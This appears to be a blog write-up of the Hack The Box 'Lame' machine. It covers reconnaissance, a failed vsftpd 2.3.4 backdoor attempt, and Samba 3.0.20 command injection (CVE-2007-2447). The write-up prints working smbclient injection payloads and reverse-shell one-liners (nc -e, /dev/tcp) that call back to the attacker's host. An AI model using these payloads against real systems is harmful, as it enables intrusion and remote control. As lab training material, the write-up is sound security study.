---
layout: post
title:  "Lame Writeup - Hack The Box"
date:   2025-02-20
desc: ""
keywords: "HTB,eJPT,Linux,VSFTP2.3.4,Samba3.0.20,Easy"
categories: [HTB]
tags: [HTB,eJPT,Linux,VSFPT2.3.4,Samba3.0.20,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/lame_writeup/Lame.jpg" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

After some time without posting my Writeups, I resume this beautiful actvity to start with an **Easy** **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine, the **Lame** box. The initial scan made me think that it was going to be easy to access the machine, but I immediately found a difficulty with the vulnerability exploit, that's the beauty of using this platform, it presents you with new challenges that promote research to find alternative ways. So all that's left is to spawn the box and start the engagement.

<br /><br />
<img src="{{ site.img_path }}/lame_writeup/Lame_00.jpg" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I test the connectivity with the box, using the basic reconnaissance commands, I also validate that the target operating system is Windows and also see which ports are exposed using the `nmap` tool.

```bash
ping -c 1 10.129.140.158
whichSystem.py 10.129.140.158
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.129.140.158 -oG allPorts
```

<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I continue with `nmap` conducting the **Reconnaissance** phase, and I notice that of the versions of the services available, there is one that catches my attention and it is the **VSFTP 2.3.4** (Port 21), as I had seen many exploits of a vulnerability found in this version.

```bash
nmap -sCV -p21,22,139,445,3632 10.129.140.158 -oN targeted
#    --> vsftpd 2.3.4
#    --> OpenSSH 4.7p1 Debian 8ubuntu1
```

<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before looking for any vulnerability in the available services, I will try to access some service through the tools available on my machine, maybe I will get lucky and access some resource not allowed because of a misconfiguration, or upload content to the server. But I can't find much information accessing with `smbclient` and `smbmap` to the resources through the **Samba** protocol (port **445**), neither with `ftp` on the port **21**.

> **[vsftpd](https://www.mvps.net/docs/what-is-vsftpd-or-very-secure-ftp-daemon/){:target="_blank"}**, Very Secure FTP Daemon, is an FTP server licensed under GPL. The default FTP server is installed on some distributions like Fedora, CentOS, or RHEL.

```bash
ftp 10.129.140.158
# anonymous     :)
  dir
  put test.txt          # :(
  quit

smbclient -L 10.129.140.158 -N
smbmap -H 10.129.140.158 -u 'null' --no-banner
# Access denied on 10.129.140.158, no fun for you...
```

<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to speed up the pace a bit and search with `searchsploit` for some exploit already written for the **VSFTP** version, I can also validate with `nmap` if the service is vulnerable, but I can't do it. On the **Internet** I find **[Exploit-DB exploit](https://www.exploit-db.com/exploits/49757){:target="_blank"}**, but before downloading it I analyze the code and perform better the exploit manually, but I don't succeed in exploiting the vulnerability. There are several projects on **Github** that have published the **[exploit](https://github.com/cherrera0001/vsftpd_2.3.4_Exploit/blob/main/exploit.py){:target="_blank"}** for the **VSFPT** service, but I will download directly with `searchsploit` and try to access the machine, I have no luck either, something is blocking connections from the victim machine it seems to me.

```bash
searchsploit vsftpd 2.3.4                                 # :)
locate *.nse | grep vsftp
nmap --script ftp-vsftpd-backdoor -p21 10.129.140.158     # :(

# Manual Exploitation:
telnet 10.129.140.158 21
  USER hello:)
  PASS hello123
telnet 10.129.140.158 6200
nc 10.129.140.158 6200                                    # :(

searchsploit -m unix/remote/49757.py
mv 49757.py vsftpd_exploit.py
python vsftpd_exploit.py 10.129.140.158
python2 vsftpd_exploit.py 10.129.140.158                  # :(
```

<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I continue with the other service available on port **445**, which is a **Samba** implementation, I find with `searchsploit` that the version is also vulnerable to possible **Command Execution**. If I analyze the available exploit I find the **CVE**, and with this code I search the **Internet** for some resource available on **[Github](https://github.com/n3rdh4x0r/CVE-2007-2447){:target="_blank"}** that allows me to investigate a little more of the vulnerability. In the article **[CVE-2007-2447: Remote Command Injection Vulnerability](https://www.samba.org/samba/security/CVE-2007-2447.html){:target="_blank"}**, it informs me that it is possible to execute commands by passing parameters as arguments to `/bin/sh`. But first I must execute the command correctly before testing the vulnerability, so I turn to an article on the Internet, **[smbclient Command Examples in Linux](https://www.thegeekdiary.com/smbclient-command-examples-in-linux/){:target="_blank"}**, which gives me the information I need.

```bash
searchsploit samba 3.0
searchsploit samba 3.0.20
# 'Username' map script' Command Execution ?
searchsploit -x unix/remote/16320.rb

smbclient -L 10.129.140.158 -N -c "dir"       # :(
# tmp, opt [Folders]
smbclient //10.129.140.158/tmp -N -c 'dir'    # :)
```

<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I was able to find the correct command to inject commands, I first try sending a trace from the victim machine to my attacking machine, and the test is successful. At the moment of getting a **Reverse Shell** I don't succeed in the first attempt, maybe due to some special characters or maybe due to the use of certain binaries, but with `nc` I can get the name of the user under which I am executing commands, and it turns out to be the one with maximum privileges. After several attempts I can access to the machine through a **Reverse Shell**. When I made this machine some time ago I had problems with `smbclient`, but there is an article in **[Reddit](https://www.reddit.com/r/oscp/comments/fg956k/kali2020_htb_smbclient_protocol_negotiation/){:target="_blank"}** that helped me at the time to execute commands without problems, dfdf.

```bash
sudo tcpdump -i tun0 icmp -n
smbclient //10.129.140.158/tmp -N -c 'logon "/=`nohup ping -c 2 10.10.14.62`"'                      # :)

sudo nc -nlvp 443
smbclient //10.129.140.158/tmp -N -c 'logon "/=`nohup bash -i >&/dev/tcp/10.10.14.62/443 0>&1`"'    # :(
smbclient //10.129.140.158/tmp -N -c 'logon "/=`nohup whoami | nc 10.10.14.62 443`"'                # :)
smbclient //10.129.140.158/tmp -N -c 'logon "/=`nc -e bash 10.10.14.62 443`"'
smbclient //10.129.140.158/tmp -N -c 'logon "/=`nc -e /bin/bash 10.10.14.62 443`"'                  # :)

# In the event of an error (:protocol negotiation failed: NT_STATUS_IO_TIMEOUT):
smbclient -L 10.129.140.158 -N --option="client min protocol=NT1" -c "dir"
```

<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since I have a **Shell**, I must perform a **Console treatment** to have the fastest and most efficient mobility possible, then I can access the flags of the **low** and **high** privilege user. I was already able to compromise the machine, but I am left with some doubts as to why I could not exploit the vulnerability in the **VSFTP** service.

```bash
script /dev/null -c bash
# [Ctrl^Z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128

locate user.txt root.txt
find \-name user.txt
find \-name user.txt | xargs cat
find \-name root.txt | xargs cat

# > locate root.txt user.txt | grep -v ".gz" | xargs cat        :(
```

<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I search for all users on the victim machine that have a `sh` shell assigned to them, I find the user **makis**. So I am going to try to exploit the **VSFTP** service manually directly on the victim machine and then try to get a **Reverse Shell** on my attacker machine, but I can't do it, but after several attempts I can get a **shell** but only on the victim machine, everything makes me think that there is a **Firewall** blocking some outgoing connections.

> **Victime Machine**:

```bash
cat /etc/passwd | grep 'sh$'
su - makis -c bash
telnet 127.0.0.1 21
  USER hello:)
  PASS password
```

> **Attacker Machine**:

```bash
sudo nc -nlvp 443
smbclient //10.129.140.158/tmp -N -c 'logon "/=`nc -e /bin/bash 10.10.14.62 443`"'
```

> **Victime Machine**:

```bash
netstat -nltp | grep 6200                                                             # :)

nc 127.0.0.1 6200                                                                     # [After several times]
```

<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">

> The great thing about the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform is that even with **Easy** machines you can learn and strengthen basic pentesting concepts. I am going to look for my next challenge and continue my ongoing practice to improve my skills in the field of **Informatic Security**. I must not forget to kill the box.

<br />
<img src="{{ site.img_path }}/lame_writeup/Lame_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
